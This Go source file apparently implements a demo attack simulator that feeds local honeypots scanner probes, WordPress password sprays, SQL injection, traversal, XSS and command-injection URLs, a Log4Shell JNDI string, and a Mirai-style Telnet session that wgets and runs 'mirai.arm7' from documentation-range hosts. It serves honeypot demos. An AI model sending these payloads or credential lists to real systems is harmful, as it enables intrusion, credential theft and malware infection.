// Package attacker is a harmless attack simulator for demos. It opens real connections to the local honeypots and
// behaves like common internet noise: web scanners, SQL injection, Log4Shell, Telnet botnets and password sprays.
// It labels connections with documentation-range addresses (RFC 5737) through X-Forwarded-For and the PROXY protocol.
package attacker

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Sim struct {
	HTTPAddr   string
	TelnetAddr string
	rng        *rand.Rand
	client     *http.Client
}

func New(httpAddr, telnetAddr string, seed int64) *Sim {
	return &Sim{HTTPAddr: httpAddr, TelnetAddr: telnetAddr, rng: rand.New(rand.NewSource(seed)), client: &http.Client{Timeout: 5 * time.Second}}
}

var ranges = []string{"198.51.100.", "203.0.113.", "192.0.2."}
var iotCreds = [][2]string{{"admin", "admin"}, {"root", "xc3511"}, {"root", "vizxv"}, {"admin", "1234"}, {"support", "support"}, {"root", "123456"}, {"user", "user"}, {"admin", "password"}, {"root", "juantech"}, {"ubnt", "ubnt"}}
var webCreds = [][2]string{{"admin", "admin123"}, {"administrator", "P@ssw0rd"}, {"admin", "letmein"}, {"wpadmin", "wordpress"}, {"root", "toor"}}
var sensitive = []string{"/.env", "/.git/config", "/wp-config.php.bak", "/backup.sql", "/phpinfo.php", "/server-status", "/actuator/env", "/.aws/credentials"}
var scanners = []string{"sqlmap/1.7.2#stable (https://sqlmap.org)", "Nikto/2.5.0", "zgrab/0.x", "Mozilla/5.0 (compatible; Nuclei)", "gobuster/3.6"}
var payloadHosts = []string{"198.51.100.77", "203.0.113.200", "192.0.2.150"}

func (s *Sim) ip() string {
	return fmt.Sprintf("%s%d", ranges[s.rng.Intn(len(ranges))], 1+s.rng.Intn(254))
}

func (s *Sim) get(ctx context.Context, src, path, ua string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, "http://"+s.HTTPAddr+path, nil)
	if err != nil {
		return
	}
	req.Header.Set("X-Forwarded-For", src)
	req.Header.Set("User-Agent", ua)
	if resp, err := s.client.Do(req); err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func (s *Sim) post(ctx context.Context, src, path, user, pass string) {
	form := url.Values{"user": {user}, "pass": {pass}}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, "http://"+s.HTTPAddr+path, strings.NewReader(form.Encode()))
	if err != nil {
		return
	}
	req.Header.Set("X-Forwarded-For", src)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
	if resp, err := s.client.Do(req); err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func (s *Sim) telnet(ctx context.Context, src string, lines []string) {
	var d net.Dialer
	c, err := d.DialContext(ctx, "tcp", s.TelnetAddr)
	if err != nil {
		return
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(8 * time.Second))
	go io.Copy(io.Discard, c)
	fmt.Fprintf(c, "PROXY TCP4 %s 10.0.0.2 40000 23\r\n", src)
	for _, l := range lines {
		fmt.Fprintf(c, "%s\r\n", l)
		time.Sleep(15 * time.Millisecond)
	}
}

// Actors lists the behaviours the simulator can perform.
var Actors = []string{"scanner", "web-bruteforce", "exploit", "botnet"}

// Step performs one actor interaction and returns its name.
func (s *Sim) Step(ctx context.Context) string {
	src := s.ip()
	actor := Actors[s.rng.Intn(len(Actors))]
	switch actor {
	case "scanner":
		ua := scanners[s.rng.Intn(len(scanners))]
		for i := 0; i < 3; i++ {
			s.get(ctx, src, sensitive[s.rng.Intn(len(sensitive))], ua)
		}
	case "web-bruteforce":
		for i := 0; i < 3; i++ {
			c := webCreds[s.rng.Intn(len(webCreds))]
			s.post(ctx, src, "/wp-login.php", c[0], c[1])
		}
	case "exploit":
		paths := []string{"/index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "/download?file=../../../../etc/passwd", "/search?q=<script>alert(1)</script>", "/ping?host=127.0.0.1;cat%20/etc/passwd"}
		s.get(ctx, src, paths[s.rng.Intn(len(paths))], "curl/7.68.0")
		if s.rng.Intn(2) == 0 {
			s.get(ctx, src, "/", "${jndi:ldap://203.0.113.9:1389/a}")
		}
	case "botnet":
		var lines []string
		for i := 0; i < 3; i++ {
			c := iotCreds[s.rng.Intn(len(iotCreds))]
			lines = append(lines, c[0], c[1])
		}
		host := payloadHosts[s.rng.Intn(len(payloadHosts))]
		lines = append(lines, "uname -a", "cat /etc/passwd", fmt.Sprintf("wget http://%s/bins/mirai.arm7 -O /tmp/.x", host), "chmod +x /tmp/.x", "/tmp/.x", "exit")
		s.telnet(ctx, src, lines)
	}
	return actor
}

// Run steps at the given interval until ctx is cancelled.
func (s *Sim) Run(ctx context.Context, every time.Duration) {
	t := time.NewTicker(every)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			s.Step(ctx)
		}
	}
}
